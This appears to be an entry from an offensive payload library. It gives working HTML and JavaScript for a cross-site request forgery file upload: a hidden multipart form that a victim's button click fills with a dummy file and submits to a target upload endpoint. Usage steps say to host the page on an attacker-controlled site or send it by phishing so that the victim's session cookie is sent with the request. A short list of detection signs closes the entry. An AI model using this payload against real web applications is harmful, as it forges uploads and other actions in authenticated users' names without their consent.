---
id: 79f9f186-2aa5-4a3a-a2f1-2c7d2b6657eb
type: code
language: HTML
verified: true
created_at: '2023-04-06T03:55:56.189518+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - csrf
  - file-upload
  - payload
  - web-attack
platforms:
  - Web
validated: true
---

# CSRF-File-Upload-HTML-Payload

## Code

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>
```

## Description

This HTML code creates a hidden form that simulates a file upload using JavaScript to generate a dummy file object and submit it to the target endpoint. When the victim clicks the button, it forges a multipart/form-data POST request, exploiting CSRF to perform unauthorized actions on a web application where the victim is authenticated.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <target> | The URL of the target web application's file upload endpoint | https://target.com/upload |

## Usage

Host this HTML on an attacker-controlled website or deliver via phishing. The victim must be logged into the target site. Customize the form fields to match the target's upload requirements. Upon clicking the button, the JavaScript populates the file input with dummy content ("CSRF-filecontent" in "CSRF-filename") and submits, sending the request with the victim's session cookie.

## Detection

- Browser CSP violations or inline script executions from untrusted domains.
- Web server logs showing file uploads from unexpected referer headers or user-agents.
- Anomalous POST requests to upload endpoints without corresponding GET navigation.
- JavaScript errors or DataTransfer API usage in client-side monitoring tools.

## Related

- [[procedures/Perform-CSRF-Attack-via-File-Upload]]
